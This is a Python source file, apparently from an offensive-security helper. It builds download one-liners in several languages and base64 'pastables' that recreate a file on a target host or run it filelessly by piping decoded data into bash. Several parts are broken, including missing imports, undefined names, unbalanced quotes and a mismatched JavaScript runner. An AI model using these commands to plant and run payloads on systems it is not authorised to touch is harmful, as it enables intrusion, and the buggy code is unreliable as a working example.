from helpers import populateChoices, pasta, verifyHash
from subprocess import run, DEVNULL, PIPE
from os import path

Download_Methods = [
    'wget',
    'cURL',
    'Python 3',
    'Python 2.7',
    'PHP',
    'Ruby',
    'Perl',
    'JavaScript'
]

def download(url):
    # SELECT DOWNLOAD METHOD
    entrymsg = '[?] Which download method to use:'
    choice = populateChoices(entrymsg, Download_Methods)
    if choice == 'Python 3':
        try:
            urllib.request.urlretrieve(url, url.split('/')[-1])
            print('[+] File successfully downloaded')
        except:
            print('[!] File could not be downloaded')
    else:
        if choice == 'wget':
            cmd = f'wget {url}'
        elif choice == 'cURL':
            cmd = 'curl ' + url + ' -o ' + url.split('/')[-1]
        elif choice == 'Python 2.7':
            cmd = 'python2.7 -c \'import urllib;urllib.urlretrieve (' + url + ', ' + url.split('/')[-1] + ')\''
        elif choice == 'PHP':
            choice = populateChoices(entrymsg, PHP_Download_Methods)
            if choice == 'File_Get_Contents()':
                cmd = 'php -r \'\$file = file_get_contents(\"' + url + '\"); file_put_contents(\"' + url.split('/')[-1] + '\",\$file);\''
            elif choice == 'Fopen()':
                cmd = 'php -r \'const BUFFER = 1024;'
                cmd += '\$fremote = fopen (\"' + url + '\", \"rb\");'
                cmd += '\$flocal = fopen(\"' + url.split('/')[-1] + ', \"wb\");'
                cmd += 'while (\$buffer = fread(\$fremote, BUFFER)) \{ fwrite(\$flocal, \$buffer); \} '
                cmd += 'fclose(\$flocal); fclose(\$remote);'
        elif choice == 'Ruby':
            cmd = 'ruby -e \'require \"net/http\"; File.write(\"' + url.split('/')[-1] + '\", Net::HTTP.get(URI.parse(\"' + url + '\")))\''
        elif choice == 'Perl':
            cmd = 'perl -e \'use LWP::Simple; getstore(\"' + url + '\", \"' + url.split('/')[-1] + '\");\''
        elif choice == 'JavaScript':
            cmd = 'echo \'var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");\' > get.js &&'
            cmd += 'echo \'WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);\' >> get.js &&'
            cmd += 'echo \'WinHttpReq.Send();\' >> get.js &&'
            cmd += 'echo \'BinStream = new ActiveXObject("ADODB.Stream");\' >> get.js &&'
            cmd += 'echo \'BinStream.Type = 1;\' >> get.js &&'
            cmd += 'echo \'BinStream.Open();\' >> get.js &&'
            cmd += 'echo \'BinStream.Write(WinHttpReq.ResponseBody);\' >> get.js &&'
            cmd += 'echo \'BinStream.SaveToFile(WScript.Arguments(1));\' >> get.js'
            cmd += 'node get.js ' + url + ' ' + url.split('/')[-1]

        proc = run(cmd.split(), stdout=DEVNULL, stderr=DEVNULL)

        if proc.returncode == 0:
            print('[+] File successfully downloaded')
        else:
            print('[!] File could not be downloaded')
            if proc.returncode == 8:
                print('[!] Check the link and try again')
            else:
                print(proc.returncode)

def base64UploadTo(filePath, method):
    # GET FILE ABSOLUTE PATH
    filename = path.basename(path.normpath(filePath))

    # GENERATE BASE64 STRING
    print('[+] Generating Base64 string of file ...')
    cmd = f'cat {filePath} | base64 -w 0'
    try:
        proc = run(cmd, shell=True, stdout=PIPE, text=True)
        b64 = proc.stdout
    except KeyboardInterrupt:
        print('[!] File doesn\'t exist')

    # PASTABLES
    if method == 'Base64':
        cmd = '# CREATE ' + filename.upper() + ' ON TARGET\n'
        cmd += 'echo -n \'' + b64 + '\' | base64 -d > ' + filename + '\n'
        cmd += '\n# GENERATE MD5 CHECKSUM FOR TRANSFERRED FILE\n'
        cmd += 'md5sum ' + filename
    elif method == 'Base64 - Fileless':
        cmd = '# EXECUTE ' + filename.upper() + ' ON TARGET\n'
        cmd += 'echo -n \'' + b64 + ' | base64 -d | bash'
    pasta(cmd)

    verifyHash(filePath)
